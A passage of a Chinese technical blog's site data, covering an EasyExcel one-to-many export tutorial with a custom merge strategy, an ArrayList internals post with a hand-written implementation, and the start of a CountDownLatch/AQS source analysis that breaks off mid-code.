由于easyexcel本身并不支持这种一对多的信息导出，所以我们得自行实现下，这里分享一个我平时常用的快速查找解决方案的办法。\n\n我们可以直接从开源项目的issues里面去搜索，比如搜索下一对多，会直接找到有无一对多导出比较优雅的方案这个issue。\n\n\n\n从此issue的回复我们可以发现，项目维护者建议创建自定义合并策略来实现，有位回复的老哥已经给出了实现代码，接下来我们就用这个方案来实现下。\n\n\n\n# 解决思路\n\n为什么自定义单元格合并策略能实现一对多的列表信息的导出呢？首先我们来看下将嵌套数据平铺，不进行合并导出的excel。\n\n\n\n看完之后我们很容易理解解决思路，只要把订单id相同的列中需要合并的列给合并了，就可以实现这种一对多嵌套信息的导出了。\n\n# 实现过程\n\n * 首先我们得把原来嵌套的订单商品信息给平铺了，创建一个专门的导出对象orderdata，包含订单和商品信息，二级表头可以通过设置@excelproperty的value为数组来实现；\n\n/**\n * 订单导出\n * created by macro on 2021/12/30.\n */\n@data\n@equalsandhashcode(callsuper = false)\npublic class orderdata {\n    @excelproperty(value = "订单id")\n    @columnwidth(10)\n    @custommerge(needmerge = true, ispk = true)\n    private string id;\n    @excelproperty(value = "订单编码")\n    @columnwidth(20)\n    @custommerge(needmerge = true)\n    private string ordersn;\n    @excelproperty(value = "创建时间")\n    @columnwidth(20)\n    @datetimeformat("yyyy-mm-dd")\n    @custommerge(needmerge = true)\n    private date createtime;\n    @excelproperty(value = "收货地址")\n    @custommerge(needmerge = true)\n    @columnwidth(20)\n    private string receiveraddress;\n    @excelproperty(value = {"商品信息", "商品编码"})\n    @columnwidth(20)\n    private string productsn;\n    @excelproperty(value = {"商品信息", "商品名称"})\n    @columnwidth(20)\n    private string name;\n    @excelproperty(value = {"商品信息", "商品标题"})\n    @columnwidth(30)\n    private string subtitle;\n    @excelproperty(value = {"商品信息", "品牌名称"})\n    @columnwidth(20)\n    private string brandname;\n    @excelproperty(value = {"商品信息", "商品价格"})\n    @columnwidth(20)\n    private bigdecimal price;\n    @excelproperty(value = {"商品信息", "商品数量"})\n    @columnwidth(20)\n    private integer count;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n\n * 然后将原来嵌套的order对象列表转换为orderdata对象列表；\n\n/**\n * easyexcel导入导出测试controller\n * created by macro on 2021/10/12.\n */\n@controller\n@api(tags = "easyexcelcontroller", description = "easyexcel导入导出测试")\n@requestmapping("/easyexcel")\npublic class easyexcelcontroller {\n    private list<orderdata> convert(list<order> orderlist) {\n        list<orderdata> result = new arraylist<>();\n        for (order order : orderlist) {\n            list<product> productlist = order.getproductlist();\n            for (product product : productlist) {\n                orderdata orderdata = new orderdata();\n                beanutil.copyproperties(product,orderdata);\n                beanutil.copyproperties(order,orderdata);\n                result.add(orderdata);\n            }\n        }\n        return result;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n * 再创建一个自定义注解custommerge，用于标记哪些属性需要合并，哪个是主键；\n\n/**\n * 自定义注解，用于判断是否需要合并以及合并的主键\n */\n@target({elementtype.field})\n@retention(retentionpolicy.runtime)\n@inherited\npublic @interface custommerge {\n\n    /**\n     * 是否需要合并单元格\n     */\n    boolean needmerge() default false;\n\n    /**\n     * 是否是主键,即该字段相同的行合并\n     */\n    boolean ispk() default false;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n * 再创建自定义单元格合并策略类custommergestrategy，当excel中两列主键相同时，合并被标记需要合并的列；\n\n/**\n * 自定义单元格合并策略\n */\npublic class custommergestrategy implements rowwritehandler {\n    /**\n     * 主键下标\n     */\n    private integer pkindex;\n\n    /**\n     * 需要合并的列的下标集合\n     */\n    private list<integer> needmergecolumnindex = new arraylist<>();\n\n    /**\n     * dto数据类型\n     */\n    private class<?> elementtype;\n\n    public custommergestrategy(class<?> elementtype) {\n        this.elementtype = elementtype;\n    }\n\n    @override\n    public void afterrowdispose(writesheetholder writesheetholder, writetableholder writetableholder, row row, integer relativerowindex, boolean ishead) {\n        // 如果是标题,则直接返回\n        if (ishead) {\n            return;\n        }\n\n        // 获取当前sheet\n        sheet sheet = writesheetholder.getsheet();\n\n        // 获取标题行\n        row titlerow = sheet.getrow(0);\n\n        if (null == pkindex) {\n            this.lazyinit(writesheetholder);\n        }\n\n        // 判断是否需要和上一行进行合并\n        // 不能和标题合并，只能数据行之间合并\n        if (row.getrownum() <= 1) {\n            return;\n        }\n        // 获取上一行数据\n        row lastrow = sheet.getrow(row.getrownum() - 1);\n        // 将本行和上一行是同一类型的数据(通过主键字段进行判断)，则需要合并\n        if (lastrow.getcell(pkindex).getstringcellvalue().equalsignorecase(row.getcell(pkindex).getstringcellvalue())) {\n            for (integer needmerindex : needmergecolumnindex) {\n                cellrangeaddress cellrangeaddress = new cellrangeaddress(row.getrownum() - 1, row.getrownum(),\n                        needmerindex, needmerindex);\n                sheet.addmergedregionunsafe(cellrangeaddress);\n            }\n        }\n    }\n\n    /**\n     * 初始化主键下标和需要合并字段的下标\n     */\n    private void lazyinit(writesheetholder writesheetholder) {\n\n        // 获取当前sheet\n        sheet sheet = writesheetholder.getsheet();\n\n        // 获取标题行\n        row titlerow = sheet.getrow(0);\n        // 获取dto的类型\n        class<?> eletype = this.elementtype;\n\n        // 获取dto所有的属性\n        field[] fields = eletype.getdeclaredfields();\n\n        // 遍历所有的字段，因为是基于dto的字段来构建excel，所以字段数 >= excel的列数\n        for (field thefield : fields) {\n            // 获取@excelproperty注解，用于获取该字段对应在excel中的列的下标\n            excelproperty easyexcelanno = thefield.getannotation(excelproperty.class);\n            // 为空,则表示该字段不需要导入到excel,直接处理下一个字段\n            if (null == easyexcelanno) {\n                continue;\n            }\n            // 获取自定义的注解，用于合并单元格\n            custommerge custommerge = thefield.getannotation(custommerge.class);\n\n            // 没有@custommerge注解的默认不合并\n            if (null == custommerge) {\n                continue;\n            }\n\n            for (int index = 0; index < fields.length; index++) {\n                cell thecell = titlerow.getcell(index);\n                // 当配置为不需要导出时，返回的为null，这里作一下判断，防止npe\n                if (null == thecell) {\n                    continue;\n                }\n                // 将字段和excel的表头匹配上\n                if (easyexcelanno.value()[0].equalsignorecase(thecell.getstringcellvalue())) {\n                    if (custommerge.ispk()) {\n                        pkindex = index;\n                    }\n\n                    if (custommerge.needmerge()) {\n                        needmergecolumnindex.add(index);\n                    }\n                }\n            }\n        }\n\n        // 没有指定主键，则异常\n        if (null == this.pkindex) {\n            throw new illegalstateexception("使用@custommerge注解必须指定主键");\n        }\n\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n\n * 接下来在controller中添加导出订单列表的接口，将我们自定义的合并策略custommergestrategy给注册上去；\n\n/**\n * easyexcel导入导出测试controller\n * created by macro on 2021/10/12.\n */\n@controller\n@api(tags = "easyexcelcontroller", description = "easyexcel导入导出测试")\n@requestmapping("/easyexcel")\npublic class easyexcelcontroller {\n    \n    @sneakythrows\n    @apioperation(value = "导出订单列表excel")\n    @requestmapping(value = "/exportorderlist", method = requestmethod.get)\n    public void exportorderlist(httpservletresponse response) {\n        list<order> orderlist = getorderlist();\n        list<orderdata> orderdatalist = convert(orderlist);\n        setexcelrespprop(response, "订单列表");\n        easyexcel.write(response.getoutputstream())\n                .head(orderdata.class)\n                .registerwritehandler(new custommergestrategy(orderdata.class))\n                .exceltype(exceltypeenum.xlsx)\n                .sheet("订单列表")\n                .dowrite(orderdatalist);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n * 在swagger中访问接口测试，导出订单列表对应excel；\n\n\n\n * 下载完成后，查看下文件，由于easyexcel需要自己来实现，对比之前使用easypoi来实现麻烦了不少。\n\n\n\n\n# 其他使用\n\n由于easyexcel的官方文档介绍的比较简单，如果你想要更深入地进行使用的话，建议大家看下官方demo。\n\n\n\n\n# 总结\n\n体验了一把easyexcel，使用还是挺方便的，性能也很优秀。但是比较常见的一对多导出实现比较复杂，而且功能也不如easypoi 强大。如果你的excel导出数据量不大的话，可以使用easypoi，如果数据量大，比较在意性能的话，还是使用easyexcel吧。\n\n来源于 https://mp.weixin.qq.com/s/1c9ojd9gauo70ihju3jo8a\n\n\n# 参考资料\n\n * 项目地址：https://github.com/alibaba/easyexcel\n * 官方文档：https://www.yuque.com/easyexcel/doc/easyexcel\n\n\n# 项目源码地址\n\nhttps://github.com/macrozheng/mall-learning/tree/master/mall-tiny-easyexcel',charsets:{cjk:!0},lastUpdated:"2024/11/15, 20:41:37",lastUpdatedTimestamp:1731674497e3},{title:"ArrayList 底层实现和原理",frontmatter:{title:"ArrayList 底层实现和原理",date:"2017-06-13T20:53:26.000Z",tags:["源码分析","Java"],categories:["后端 Back-end"],isShowComments:!1},regularPath:"/views/backend/ArrayList.html",relativePath:"views/backend/ArrayList.md",key:"v-1e03abb4",path:"/views/backend/ArrayList.html",headers:[{level:2,title:"ArrayList底层简介",slug:"arraylist底层简介",normalizedTitle:"arraylist底层简介",charIndex:100},{level:2,title:"手写一个简单的MyArrayList",slug:"手写一个简单的myarraylist",normalizedTitle:"手写一个简单的myarraylist",charIndex:117},{level:2,title:"ArrayList的线程安全性",slug:"arraylist的线程安全性",normalizedTitle:"arraylist的线程安全性",charIndex:139},{level:2,title:"ArrayList和LinkedList、Vector的优缺点？",slug:"arraylist和linkedlist、vector的优缺点",normalizedTitle:"arraylist和linkedlist、vector的优缺点？",charIndex:158}],excerpt:"<Boxx/>\n<p>ArrayList可以简单的看作是动态数组，相对于普通的数组它可以动态的增加容量或者减少容量。要注意的是ArrayList并不是线程安全的，因此一般建议在单线程中使用ArrayList。</p>\n",headersStr:"ArrayList底层简介 手写一个简单的MyArrayList ArrayList的线程安全性 ArrayList和LinkedList、Vector的优缺点？",content:'ArrayList可以简单的看作是动态数组，相对于普通的数组它可以动态的增加容量或者减少容量。要注意的是ArrayList并不是线程安全的，因此一般建议在单线程中使用ArrayList。\n\n\n\n * ArrayList底层简介\n * 手写一个简单的MyArrayList\n * ArrayList的线程安全性\n * ArrayList和LinkedList、Vector的优缺点？\n\n\n\n\n# ArrayList底层简介\n\n * ArrayList是List接口的一个可变大小的数组的实现\n * ArrayList的内部是使用一个Object对象数组来存储元素的\n * 初始化ArrayList的时候，可以指定初始化容量的大小，如果不指定，就会使用默认大小，为10\n * 当添加一个新元素的时候，首先会检查容量是否足够添加这个元素，如果够就直接添加，如果不够就进行扩容，扩容为原数组容量的1.5倍（1.7以后）\n * 当在index处放置一个元素的时候，会将数组index处右边的元素全部右移\n * 当在index处删除一个元素的时候，会将数组index处右边的元素全部左移\n\n\n# 手写一个简单的MyArrayList\n\npackage com.zpj.electric.SourceCodeAnalysis;\n\n/**\n * Created by admin on 2017/6/10.\n */\npublic class MyArrayList {\n\n    //ArrayList有一个专门用来装元素的容器，为了保证集合什么类型的数据都可存储，所以定义的Object[]\n    public Object[] data;\n    //ArrayList里还有一个属性，用来记录集合元素的个数\n    public int size;\n\n    /**\n     * 有参构造方法\n     *\n     * @param x 指定数组大小\n     */\n    public MyArrayList(int x) {\n        if (x > 0) {\n            data = new Object[x];\n        } else {\n            System.out.println("参数异常");\n        }\n    }\n\n    /**\n     * 如果指定数组大小，默认10个\n     */\n    public MyArrayList() {\n        this(10);\n    }\n\n    /**\n     * 得到集合的大小  如：int x = list.size();\n     *\n     * @return\n     */\n    public int size() {\n        return size;\n    }\n\n    /**\n     * 往集合中添加元素 如：list.add(Object obj);\n     *\n     * @param obj\n     */\n    public void add(Object obj) {\n        //当我们往集合中添加元素的时候，obj最终都会添加进Object[]数组中去\n        //所以每次添加数据的时候都需要判断Object[],即data数组有没有填满\n        if (data.length == size) {\n            //如果填满了，那么需要扩容:\n            // jdk1.7之前：size*3/2+1\n            // jdk1.7及之后：size+(size>>1)\n            Object[] temp = new Object[size + (size >> 1)];\n            //扩容后将老数组复制到新数组里\n            System.arraycopy(data, 0, temp, 0, size);\n            //改变引用指向 gc回收老数组对象\n            data = temp;\n        }\n        \n        data[size] = obj;\n        size++;\n    }\n\n    /**\n     * 按指定下标删除集合中的元素\n     *\n     * @param index\n     */\n    public void remove(int index) {\n        //System.arraycopy(要被复制的老数组，从下标index开始复制，要复制到的新数组，从新数组的下标index插入,从老数组下标开始要被复制的个数);\n        System.arraycopy(data, index + 1, data, index, size - (index + 1));\n        size--;\n    }\n\n    /**\n     * 指定元素删除集合中的元素\n     *\n     * @param obj\n     */\n    public void remove(Object obj) {\n        //每当指定元素删除的时候，底层会拿着obj和每个元素做equals比较\n        for (int x = 0; x < size; x++) {\n            if (obj.equals(data[x])) {\n                remove(x);//按下标删除元素\n                break;//一个remove方法只能删除一个对象\n            }\n        }\n    }\n\n    /**\n     * 根据指定下标获得元素\n     *\n     * @param x\n     * @return\n     */\n    public Object get(int x) {\n        return x >= 0 && x < size ? data[x] : "参数越界异常";\n    }\n\n}\n\nclass TestMyArrayList {\n    public static void main(String[] args) {\n        MyArrayList myArrayList = new MyArrayList();\n        myArrayList.add(234);\n        myArrayList.add("john");\n        myArrayList.add("demon");\n        myArrayList.add("alex");\n        System.out.println(myArrayList.size());\n        System.out.println(myArrayList.get(2));\n\n        myArrayList.remove(1);\n        System.out.println(myArrayList.size());\n\n        MyArrayList myArrayList1 = new MyArrayList(20);\n        System.out.println(myArrayList1.data.length);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n116\n117\n118\n119\n\n\n> ArrayList其他方法如add(int index, E element)，contains(E)可以去看：https://blog.csdn.net/aizhuyanwei/article/details/78493495\n\n\n# ArrayList的线程安全性\n\n对ArrayList进行添加元素的操作的时候是分两个步骤进行的，即第一步先在object[size]的位置上存放需要添加的元素；第二步将size的值增加1。由于这个过程在多线程的环境下是不能保证具有原子性的，因此ArrayList在多线程的环境下是线程不安全的。\n\n具体举例说明：在单线程运行的情况下，如果Size = 0，添加一个元素后，此元素在位置 0，而且Size=1；而如果是在多线程情况下，比如有两个线程，线程 A 先将元素存放在位置0。但是此时 CPU 调度线程A暂停，线程 B 得到运行的机会。线程B也向此ArrayList 添加元素，因为此时 Size 仍然等于 0 （注意哦，我们假设的是添加一个元素是要两个步骤哦，而线程A仅仅完成了步骤1），所以线程B也将元素存放在位置0。然后线程A和线程B都继续运行，都增 加 Size 的值。 那好，现在我们来看看 ArrayList 的情况，元素实际上只有一个，存放在位置 0，而Size却等于 2。这就是“线程不安全”了。\n\n如果非要在多线程的环境下使用ArrayList，就需要保证它的线程安全性，通常有两种解决办法：第一，使用synchronized关键字；第二，可以用Collections类中的静态方法synchronizedList();对ArrayList进行调用即可。\n\n\n# ArrayList和LinkedList、Vector的优缺点？\n\n * ArrayList底层是数组结构，查询快，增删慢，线程不安全，效率高\n\n * LinkedList底层是链表数据结构，查询慢，增删快，线程不安全，效率高\n\n * Vector底层是数组结构，查询快，增删慢，线程安全，效率低',normalizedContent:'arraylist可以简单的看作是动态数组，相对于普通的数组它可以动态的增加容量或者减少容量。要注意的是arraylist并不是线程安全的，因此一般建议在单线程中使用arraylist。\n\n\n\n * arraylist底层简介\n * 手写一个简单的myarraylist\n * arraylist的线程安全性\n * arraylist和linkedlist、vector的优缺点？\n\n\n\n\n# arraylist底层简介\n\n * arraylist是list接口的一个可变大小的数组的实现\n * arraylist的内部是使用一个object对象数组来存储元素的\n * 初始化arraylist的时候，可以指定初始化容量的大小，如果不指定，就会使用默认大小，为10\n * 当添加一个新元素的时候，首先会检查容量是否足够添加这个元素，如果够就直接添加，如果不够就进行扩容，扩容为原数组容量的1.5倍（1.7以后）\n * 当在index处放置一个元素的时候，会将数组index处右边的元素全部右移\n * 当在index处删除一个元素的时候，会将数组index处右边的元素全部左移\n\n\n# 手写一个简单的myarraylist\n\npackage com.zpj.electric.sourcecodeanalysis;\n\n/**\n * created by admin on 2017/6/10.\n */\npublic class myarraylist {\n\n    //arraylist有一个专门用来装元素的容器，为了保证集合什么类型的数据都可存储，所以定义的object[]\n    public object[] data;\n    //arraylist里还有一个属性，用来记录集合元素的个数\n    public int size;\n\n    /**\n     * 有参构造方法\n     *\n     * @param x 指定数组大小\n     */\n    public myarraylist(int x) {\n        if (x > 0) {\n            data = new object[x];\n        } else {\n            system.out.println("参数异常");\n        }\n    }\n\n    /**\n     * 如果指定数组大小，默认10个\n     */\n    public myarraylist() {\n        this(10);\n    }\n\n    /**\n     * 得到集合的大小  如：int x = list.size();\n     *\n     * @return\n     */\n    public int size() {\n        return size;\n    }\n\n    /**\n     * 往集合中添加元素 如：list.add(object obj);\n     *\n     * @param obj\n     */\n    public void add(object obj) {\n        //当我们往集合中添加元素的时候，obj最终都会添加进object[]数组中去\n        //所以每次添加数据的时候都需要判断object[],即data数组有没有填满\n        if (data.length == size) {\n            //如果填满了，那么需要扩容:\n            // jdk1.7之前：size*3/2+1\n            // jdk1.7及之后：size+(size>>1)\n            object[] temp = new object[size + (size >> 1)];\n            //扩容后将老数组复制到新数组里\n            system.arraycopy(data, 0, temp, 0, size);\n            //改变引用指向 gc回收老数组对象\n            data = temp;\n        }\n        \n        data[size] = obj;\n        size++;\n    }\n\n    /**\n     * 按指定下标删除集合中的元素\n     *\n     * @param index\n     */\n    public void remove(int index) {\n        //system.arraycopy(要被复制的老数组，从下标index开始复制，要复制到的新数组，从新数组的下标index插入,从老数组下标开始要被复制的个数);\n        system.arraycopy(data, index + 1, data, index, size - (index + 1));\n        size--;\n    }\n\n    /**\n     * 指定元素删除集合中的元素\n     *\n     * @param obj\n     */\n    public void remove(object obj) {\n        //每当指定元素删除的时候，底层会拿着obj和每个元素做equals比较\n        for (int x = 0; x < size; x++) {\n            if (obj.equals(data[x])) {\n                remove(x);//按下标删除元素\n                break;//一个remove方法只能删除一个对象\n            }\n        }\n    }\n\n    /**\n     * 根据指定下标获得元素\n     *\n     * @param x\n     * @return\n     */\n    public object get(int x) {\n        return x >= 0 && x < size ? data[x] : "参数越界异常";\n    }\n\n}\n\nclass testmyarraylist {\n    public static void main(string[] args) {\n        myarraylist myarraylist = new myarraylist();\n        myarraylist.add(234);\n        myarraylist.add("john");\n        myarraylist.add("demon");\n        myarraylist.add("alex");\n        system.out.println(myarraylist.size());\n        system.out.println(myarraylist.get(2));\n\n        myarraylist.remove(1);\n        system.out.println(myarraylist.size());\n\n        myarraylist myarraylist1 = new myarraylist(20);\n        system.out.println(myarraylist1.data.length);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n116\n117\n118\n119\n\n\n> arraylist其他方法如add(int index, e element)，contains(e)可以去看：https://blog.csdn.net/aizhuyanwei/article/details/78493495\n\n\n# arraylist的线程安全性\n\n对arraylist进行添加元素的操作的时候是分两个步骤进行的，即第一步先在object[size]的位置上存放需要添加的元素；第二步将size的值增加1。由于这个过程在多线程的环境下是不能保证具有原子性的，因此arraylist在多线程的环境下是线程不安全的。\n\n具体举例说明：在单线程运行的情况下，如果size = 0，添加一个元素后，此元素在位置 0，而且size=1；而如果是在多线程情况下，比如有两个线程，线程 a 先将元素存放在位置0。但是此时 cpu 调度线程a暂停，线程 b 得到运行的机会。线程b也向此arraylist 添加元素，因为此时 size 仍然等于 0 （注意哦，我们假设的是添加一个元素是要两个步骤哦，而线程a仅仅完成了步骤1），所以线程b也将元素存放在位置0。然后线程a和线程b都继续运行，都增 加 size 的值。 那好，现在我们来看看 arraylist 的情况，元素实际上只有一个，存放在位置 0，而size却等于 2。这就是“线程不安全”了。\n\n如果非要在多线程的环境下使用arraylist，就需要保证它的线程安全性，通常有两种解决办法：第一，使用synchronized关键字；第二，可以用collections类中的静态方法synchronizedlist();对arraylist进行调用即可。\n\n\n# arraylist和linkedlist、vector的优缺点？\n\n * arraylist底层是数组结构，查询快，增删慢，线程不安全，效率高\n\n * linkedlist底层是链表数据结构，查询慢，增删快，线程不安全，效率高\n\n * vector底层是数组结构，查询快，增删慢，线程安全，效率低',charsets:{cjk:!0},lastUpdated:"2024/11/15, 20:41:37",lastUpdatedTimestamp:1731674497e3},{title:"CountDownLatch 详解",frontmatter:{title:"CountDownLatch 详解",date:"2020-06-22T00:00:00.000Z",tags:["源码分析","多线程","Java"],categories:["后端 Back-end"],isShowComments:!1},regularPath:"/views/backend/CountDownLatch.html",relativePath:"views/backend/CountDownLatch.md",key:"v-080f7b22",path:"/views/backend/CountDownLatch.html",headers:[{level:2,title:"适用场景",slug:"适用场景",normalizedTitle:"适用场景",charIndex:38},{level:2,title:"CountDownLatch解析",slug:"countdownlatch解析",normalizedTitle:"countdownlatch解析",charIndex:46},{level:3,title:"await () 方法",slug:"await-方法",normalizedTitle:"await () 方法",charIndex:68},{level:3,title:"countDown () 方法",slug:"countdown-方法",normalizedTitle:"countdown () 方法",charIndex:85},{level:2,title:"参考",slug:"参考",normalizedTitle:"参考",charIndex:104}],excerpt:"<Boxx/>\n<p>依靠 AQS类中锁标记 state 实现的，任务的分割与合并。</p>\n",headersStr:"适用场景 CountDownLatch解析 await () 方法 countDown () 方法 参考",content:'依靠 AQS类中锁标记 state 实现的，任务的分割与合并。\n\n\n\n * 适用场景\n * CountDownLatch解析\n   * await () 方法\n   * countDown () 方法\n * 参考\n\n\n\n\n# 适用场景\n\n * 常和线程池共同出现，用做任务的分割合并，如：\n   \n   我们有90万数据，需要多线程多 Sheet 页导出 Excel，这时候就需要用到 CountDownLatch 来将这一任务具体细分。\n   \n   1. 将导出 Excel 看作一项大任务。\n   \n   2. 用线程池操作，导出的每个 Sheet 页为其中一项小任务。\n      \n      2.1 告诉 CountDownLatch 总任务数\n      \n      CountDownLatch countDownLatch = new CountDownLatch(任务总数);\n      \n      2.2 每完成一个任务就调用countDownLatch.countDown();（任务数-1）表示此项小任务已完成\n   \n   3. 在主线程调用countDownLatch.await();（即直到任务数为0时）等待所有小任务完成后，再执行其他操作。\n      \n      当然，为防止一直等待，可以加个超时时间countDownLatch.await(10L,TimeUnit.SECONDS);，超出时间后不再等待，直接唤醒 await 线程进行下一步操作。\n\n * 以上思路实例代码可见另一篇poi多线程多sheet导出Excel,csv\n\n\n# CountDownLatch解析\n\nCountDownLatch 类图如下:\n\n\n\n从图中可以看出，CountDownLatch 内部依赖 Sync 实现，而 Sync 继承自 AQS。CountDownLatch 仅提供了一个构造方法：\n\npublic CountDownLatch(int count) {\n    if (count < 0) throw new IllegalArgumentException("count < 0");\n\n    this.sync = new Sync(count);\n}\n\n\n1\n2\n3\n4\n5\n\n\nSync 是 CountDownLatch 的静态内部类，其定义也比较简单，如下所示：\n\nprivate static final class Sync extends AbstractQueuedSynchronizer {\n\n    private static final long serialVersionUID = 4982264981922014374L;\n\n    // 设置同步状态值（锁标记）\n    Sync(int count) {\n        setState(count);\n    }\n\n    // 获取同步状态值\n    int getCount() {\n        return getState();\n    }\n    \n    // 共享式获取同步状态\n    protected int tryAcquireShared(int acquires) {\n        return (getState() == 0) ? 1 : -1;\n    }\n\n    // 共享式释放同步状态\n    protected boolean tryReleaseShared(int releases) {\n        // Decrement count; signal when transition to zero\n        for (;;) {\n            // 获取当前state属性的值\n            int c = getState();\n            // 如果state为0，则说明当前计数器已经计数完成，直接返回\n            if (c == 0)\n                return false;\n            int nextc = c-1;\n            // 使用CAS算法对state进行设置\n            if (compareAndSetState(c, nextc))\n                // 设置成功后返回当前是否为最后一个设置state的线程\n                return nextc == 0;\n        }\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n\n\n\n# await () 方法\n\nCountDownLatch 提供了 await () 方法来使当前线程一直等待，直到计数器的值减为 0，或者线程被中断，该方法定义如下：\n\npublic void await() throws InterruptedException {\n    sync.acquireSharedInterruptibly(1);\n}\n\n\n1\n2\n3\n\n\nawait () 方法调用了 AQS 的共享式相应中断获取同步状态的方法，acquireSharedInterruptibly (int)，如下所示：\n\npublic final void acquireSharedInterruptibly(int arg)\n        throws InterruptedException {\n\n    if (Thread.interrupted())\n        throw new InterruptedException();\n\n    if (tryAcquireShared(arg) < 0)\n        doAcquireSharedInterruptibly(arg);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\nSync 类重写了 tryAcquireShared (int) 方法：\n\nprotected int tryAcquireShared(int acquires) {\n    return (getState() == 0) ? 1 : -1;\n}\n\n\n1\n2\n3\n\n\n可以看到，只有当计数器（即同步状态）值为 0 时，才返回 1，即当前线程获取到了同步状态，在这里表示等待线程可以继续执行，若计数器值不是 0，则当前线程会调用 doAcquireSharedInterruptibly (int) 方法，一直自旋去尝试获取同步状态：\n\nprivate void doAcquireSharedInterruptibly(int arg) throws InterruptedException {\n  final Node node = addWaiter(Node.SHARED); // 使用当前线程创建一个共享模式的节点\n  boolean failed = true;\n  try {\n    for (;;) {\n      final Node p = node.predecessor();    // 获取当前节点的前一个节点\n      if (p == head) {  // 判断前一个节点是否为头结点\n        int r = tryAcquireShared(arg);  // 查看当前线程是否获取到了执行权限\n        if (r >= 0) {   // 大于0表示获取了执行权限\n          \n          /* 发现 r 大于 0（因为 state 已经被置为 0 了），\n           * 该线程就会调用 setHeadAndPropagate (Node, int) 方法，\n           * 并且退出当前循环，\n           * 也就开始执行我们调用 await() 方法之后的代码\n           */\n          setHeadAndPropagate(node, r); // 将当前节点设置为头结点，并且唤醒后面处于等待状态的节点\n          p.next = null; // help GC\n          failed = false;\n          return;\n        }\n      }\n      \n      // 走到这一步说明没有获取到执行权限，就使当前线程进入“搁置”状态\n      if (shouldParkAfterFailedAcquire(p, node) &&\n          parkAndCheckInterrupt())\n        throw new InterruptedException();\n    }\n  } finally {\n    if (failed)\n      cancelAcquire(node);\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n\n这里我们看看 setHeadAndPropagate (Node, int) 方法的具体实现：\n\nprivate void setHeadAndPropagate(Node node, int propagate) {\n  Node h = head;\n  setHead(node);    // 将当前节点设置为头节点\n  // 检查唤醒过程是否需要往下传递，并且检查头结点的等待状态\n  if (propagate > 0 || h == null || h.waitStatus < 0 ||\n      (h = head) == null || h.waitStatus < 0) {\n    Node s = node.next;\n    if (s == null || s.isShared())  // 如果下一个节点是尝试以共享状态获取获取执行权限的节点，则将其唤醒\n      doReleaseShared();\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\nsetHeadAndPropagate (Node, int) 方法主要作用是设置当前节点为头结点，并且将唤醒工作往下传递，在传递的过程中，其会判断被传递的节点是否是以共享模式尝试获取执行权限的，如果不是，则传递到该节点处为止（一般情况下，等待队列中都只会都是处于共享模式或者处于独占模式的节点）。也就是说，头结点会依次唤醒后续处于共享状态的节点，这也就是共享锁与独占锁的实现方式。这里 doReleaseShared () 方法也就是我们前面讲到的会将离头结点最近的一个处于等待状态的节点唤醒的方法。\n\n\n# countDown () 方法\n\nCountDownLatch 提供了 countDown () 方法递减计数器的值，如果计数到达 0，则释放所有等待的线程，该方法定义如下：\n\npublic void countDown() {\n    sync.releaseShared(1);\n}\n\n\n1\n2\n3\n\n\ncountDown () 方法调用了 AQS 的 releaseShared (int) 方法来释放共享锁同步状态：\n\npublic final boolean releaseShared(int arg) {\n    if (tryReleaseShared(arg)) {\n        //doReleaseShared()主要作用是唤醒调用了await()方法的线程\n        doReleaseShared();\n        return true;\n    }\n    return 